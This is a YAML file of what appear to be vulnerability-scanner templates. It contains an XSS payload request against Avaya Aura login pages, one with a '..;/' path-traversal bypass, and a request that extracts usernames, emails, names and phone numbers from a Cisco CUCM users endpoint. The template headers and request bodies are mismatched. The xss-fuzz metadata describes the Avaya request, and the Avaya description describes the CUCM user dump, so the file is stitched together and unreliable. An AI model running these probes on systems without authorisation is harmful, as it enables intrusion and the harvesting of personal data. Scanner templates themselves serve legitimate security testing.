id: xss-fuzz
info:
  author: kazet
  classification:
    cwe-id: CWE-79
  description: 'Cross-site scripting was discovered via a search for reflected parameter
    values in the server response via GET-requests.

    '
  metadata:
    max-request: 29
    parameters: q,s,search,id,action,keyword,query,page,keywords,url,view,cat,name,key,p,month,page_id,password,terms,token,type,unsubscribe_token,api,api_key,begindate,callback,categoryid,csrf_token,email,emailto,enddate,immagine,item,jsonp,l,lang,list_type,year
  name: Fuzzing Parameters - Cross-Site Scripting
  severity: medium
  tags: xss,generic,vuln
---
http:
- matchers:
  - condition: and
    type: word
    words:
    - <script>alert(document.domain)</script>
    - Avaya Aura Device Services
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e'
  - '{{BaseURL}}/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e'
  stop-at-first-match: true
id: avaya-aura-xss
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:avaya:aura_utility_services:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: Avaya Aura Utility Services Administration contains a cross-site scripting
    vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting
    user in the context of the affected site. This can allow the attacker to steal
    cookie-based authentication credentials and launch other attacks.
  metadata:
    max-request: 2
    product: aura_utility_services
    shodan-query: html:"Avaya Aura"
    vendor: avaya
    verified: true
  name: Avaya Aura Utility Services Administration - Cross-Site Scripting
  reference:
  - https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/
  - https://download.avaya.com/css/public/documents/101076366
  severity: medium
  tags: xss,avaya,aura,iot,vuln
---
http:
- extractors:
  - name: usernames
    type: xpath
    xpath:
    - /users/user/userName
  - name: emails
    type: xpath
    xpath:
    - /users/user/email
  - name: full_names
    type: xpath
    xpath:
    - concat(/users/user/firstName, ' ', /users/user/lastName)
  - name: phone_numbers
    type: xpath
    xpath:
    - /users/user/phoneNumber
  - name: mobile_numbers
    type: xpath
    xpath:
    - /users/user/mobileNumber
  headers:
    Accept: application/xml
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <users
    - <userName>
    - <lastName>
    - <phoneNumber>
  - condition: or
    dsl:
    - contains(tolower(content_type), 'application/xml')
    - contains(tolower(content_type), 'text/xml')
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cucm-uds/users'
